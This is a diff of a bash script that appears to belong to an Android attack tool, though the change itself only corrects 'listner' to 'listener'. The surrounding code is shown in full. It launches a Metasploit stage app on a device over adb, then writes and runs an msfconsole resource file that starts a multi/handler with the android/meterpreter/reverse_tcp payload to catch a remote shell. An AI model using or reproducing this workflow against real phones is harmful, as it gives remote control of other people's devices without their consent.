@@ -103,10 +103,10 @@ apk_install () {
         fi
 }
 
-start_listner () {
+start_listener () {
 
      adb -s $devv shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 | echo -e "\e[1;93mLaunching the PAYLOAD.\e[0m"; echo -e "\n\e[1;92mDone\n"
-     echo -e "\e[1;92mStarting the MSF listner\n"
+     echo -e "\e[1;92mStarting the MSF listener\n"
      time=$(date +"%T")
      echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost1\nset LPORT $lport1\nexploit" > $PWD/metasploit/.exploit-$time.rc
      msfconsole -q -r $PWD/metasploit/.exploit-$time.rc
@@ -131,11 +131,11 @@ dev_1_payload_create () {
                   esac
                 done
                 while true; do
-                  read -p $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  read -p $'\e[93;1mDo you want to start the MSF listener.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
-                  [Yy]* ) start_listner; break;;
+                  [Yy]* ) start_listener; break;;
                   [Nn]* ) clear && bash modules/function2.sh;;
-                      * ) start_listner; break;;
+                      * ) start_listener; break;;
                   esac
                 done
 }
@@ -157,11 +157,11 @@ dev_2_payload_create () {
                   esac
                 done
                 while true; do
-                  read -p $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  read -p $'\e[93;1mDo you want to start the MSF listener.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
-                  [Yy]* ) start_listner; break;;
+                  [Yy]* ) start_listener; break;;
                   [Nn]* ) clear && bash modules/function2.sh;;
-                      * ) start_listner; break;;
+                      * ) start_listener; break;;
                   esac
                 done
 }
@@ -183,11 +183,11 @@ dev_3_payload_create () {
                   esac
                 done
                 while true; do
-                  read -p $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  read -p $'\e[93;1mDo you want to start the MSF listener.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
-                  [Yy]* ) start_listner; break;;
+                  [Yy]* ) start_listener; break;;
                   [Nn]* ) clear && bash modules/function2.sh;;
-                      * ) start_listner; break;;
+                      * ) start_listener; break;;
                   esac
                 done
 
